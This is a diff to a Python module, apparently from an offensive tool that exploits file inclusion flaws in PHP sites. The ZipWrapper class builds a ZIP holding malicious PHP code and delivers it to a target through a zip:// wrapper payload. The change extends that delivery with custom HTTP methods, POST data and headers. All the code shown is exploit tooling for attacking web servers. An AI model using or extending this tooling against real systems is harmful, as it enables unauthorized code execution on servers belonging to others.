@@ -2,7 +2,7 @@ import os
 import zipfile
 import tempfile
 from .Detection import Detection
-from .utils import attack, colors, cook
+from .utils import attack, colors, cook, parse_headers, parse_post_data
 
 
 class ZipWrapper:
@@ -11,6 +11,9 @@ class ZipWrapper:
         self.cookies = args.cookies
         self.detection = args.detection
         self.nostager = getattr(args, "nostager", False)
+        self.method = getattr(args, "method", "GET")
+        self.custom_headers = parse_headers(getattr(args, "headers", None))
+        self.post_data = parse_post_data(getattr(args, "data", None))
 
     def create_malicious_zip(self, payload):
         """Create a ZIP file containing malicious PHP code"""
@@ -31,15 +34,17 @@ class ZipWrapper:
     def attack(self, zip_path, php_filename="code.php"):
         """Attack using ZIP wrapper technique"""
         payload = f"zip://{zip_path}#{php_filename}"
+        cookies = cook(self.cookies) if self.cookies else None
 
-        if self.cookies:
-            cookies = cook(self.cookies)
-            response = attack(
-                self.target, payload, cookies=cookies, detection_mode=self.detection
-            )
-        else:
-            response = attack(self.target, payload, detection_mode=self.detection)
-
+        response = attack(
+            self.target,
+            payload,
+            cookies=cookies,
+            detection_mode=self.detection,
+            method=self.method,
+            post_data=self.post_data,
+            custom_headers=self.custom_headers,
+        )
         return response
 
     def execute_zip_wrapper(self):
